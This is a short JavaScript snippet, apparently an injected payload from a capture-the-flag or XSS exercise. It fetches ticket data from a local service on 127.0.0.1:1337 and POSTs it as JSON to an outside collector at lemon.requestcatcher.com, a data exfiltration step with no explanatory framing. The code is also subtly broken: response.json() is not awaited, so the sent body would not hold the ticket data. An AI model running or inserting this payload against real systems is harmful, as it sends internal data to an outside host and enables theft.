let response = await fetch("http://127.0.0.1:1337/tickets");
let json = response.json();

let send_data = await fetch("https://lemon.requestcatcher.com/", {
  method: 'POST',
  headers: {
    'Content-Type':'application/json;charset=utf-8'
  },
  body: JSON.stringify(json)
});
                            
